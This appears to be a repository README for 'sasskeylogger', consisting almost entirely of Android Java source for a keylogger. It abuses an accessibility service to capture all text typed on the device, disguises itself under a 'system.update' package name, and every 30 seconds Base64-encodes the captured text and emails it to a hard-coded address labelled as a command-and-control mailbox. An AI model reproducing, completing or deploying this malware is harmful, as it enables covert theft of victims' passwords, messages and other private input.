# sasskeylogger
Keylogger 
package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.view.KeyEvent;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;
import javax.mail.*;
import java.util.Properties;
import java.util.Base64;

public class KeyloggerService extends AccessibilityService {
    private ArrayList<String> buffer = new ArrayList<>();
    private Timer timer;
    
    private static final String C2_EMAIL = "tanossass23h7@gmail.com";
    private static final String SMTP_USER = "votre.email@gmail.com";
    private static final String SMTP_PASS = "votre_app_password";
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            if (text.length() > 0) buffer.add(text);
        }
    }
    
    @Override
    public void onServiceConnected() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!buffer.isEmpty()) {
                    String keys = String.join("", buffer);
                    sendEmail(keys);
                    buffer.clear();
                }
            }
        }, 0, 30000); // 30s
    }
    
    private void sendEmail(String keys) {
        new Thread(() -> {
            try {
                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");
                
                Session session = Session.getInstance(props, new Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(SMTP_USER, SMTP_PASS);
                    }
                });
                
                Message msg = new MimeMessage(session);
                msg.setFrom(new InternetAddress(SMTP_USER));
                msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse(C2_EMAIL));
                msg.setSubject("SYS:" + System.currentTimeMillis());
                msg.setText(Base64.getEncoder().encodeToString(keys.getBytes()));
                
                Transport.send(msg);
            } catch (Exception ignored) {}
        }).start();
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
    }
}
